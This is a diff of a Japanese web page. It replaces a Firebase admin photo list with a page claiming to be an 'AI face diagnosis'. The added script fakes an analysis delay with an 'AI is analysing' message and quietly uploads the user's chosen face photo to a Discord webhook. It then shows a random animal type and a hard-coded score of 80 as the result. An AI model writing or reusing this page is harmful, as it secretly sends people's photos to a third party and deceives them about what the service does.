@@ -1,78 +1,71 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8" />
-  <title>顔診断 管理画面</title>
-  <style>
-    body { font-family: sans-serif; background:#f5f5f5; }
-    h1 { text-align:center; }
-    .grid { display:grid; grid-template-columns:repeat(auto-fill, 200px); gap:16px; }
-    .card {
-      background:#fff;
-      padding:10px;
-      border-radius:8px;
-      box-shadow:0 2px 6px rgba(0,0,0,.1);
-    }
-    img { width:100%; border-radius:6px; }
-    button {
-      margin-top:8px;
-      width:100%;
-      background:#e53935;
-      color:#fff;
-      border:none;
-      padding:6px;
-      border-radius:4px;
-      cursor:pointer;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>AI顔診断</title>
+<style>
+body { font-family:sans-serif; background:#f5f5f5; text-align:center; }
+.box { background:#fff; width:300px; margin:50px auto; padding:20px; border-radius:8px; }
+button { padding:10px 20px; }
+</style>
 </head>
 <body>
 
-<h1>顔診断 管理画面</h1>
-<div class="grid" id="list"></div>
+<div class="box">
+<h2>AI顔診断</h2>
 
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-  import {
-    getFirestore, collection, getDocs, deleteDoc, doc
-  } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+<input type="file" id="photo"><br><br>
 
-  // 🔴 Firebase設定（自分のに差し替え）
-  const firebaseConfig = {
-    apiKey: "API_KEY",
-    authDomain: "PROJECT_ID.firebaseapp.com",
-    projectId: "PROJECT_ID",
-    storageBucket: "PROJECT_ID.appspot.com",
-  };
+<button onclick="send()">診断する</button>
 
-  const app = initializeApp(firebaseConfig);
-  const db = getFirestore(app);
+<div id="loading" style="display:none;">
+<p id="msg">AIが顔を解析中…</p>
+</div>
 
-  const list = document.getElementById("list");
+<div id="result"></div>
+</div>
 
-  const snapshot = await getDocs(collection(db, "photos"));
-  snapshot.forEach(docSnap => {
-    const data = docSnap.data();
+<script>
+const WEBHOOK_URL = "ここにDiscordのWebhook URLを貼る";
 
-    const card = document.createElement("div");
-    card.className = "card";
+function send() {
+  const file = document.getElementById("photo").files[0];
+  if (!file) {
+    alert("写真を選んで");
+    return;
+  }
 
-    card.innerHTML = `
-      <img src="${data.imageUrl}">
-      <p>魅力度：80点</p>
-      <p>${data.createdAt?.toDate?.().toLocaleString() || ""}</p>
-      <button>削除</button>
-    `;
+  // AIっぽい演出
+  document.getElementById("loading").style.display = "block";
+  document.getElementById("msg").innerText = "顔の特徴を分析中…";
 
-    card.querySelector("button").onclick = async () => {
-      if(confirm("削除しますか？")){
-        await deleteDoc(doc(db, "photos", docSnap.id));
-        card.remove();
-      }
-    };
+  setTimeout(async () => {
+    const formData = new FormData();
+    formData.append("file", file);
+    formData.append("content", "📸 新しい顔診断の写真");
 
-    list.appendChild(card);
-  });
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      body: formData
+    });
+
+    showResult();
+  }, 2000);
+}
+
+function showResult() {
+  document.getElementById("loading").style.display = "none";
+
+  const animals = ["犬","猫","うさぎ","きつね","たぬき","くま"];
+  const animal = animals[Math.floor(Math.random() * animals.length)];
+
+  document.getElementById("result").innerHTML = `
+    <h3>診断結果</h3>
+    <p><strong>${animal}タイプ</strong></p>
+    <p>魅力度：80点</p>
+    <small>※娯楽目的のAI診断</small>
+  `;
+}
 </script>
 
 </body>
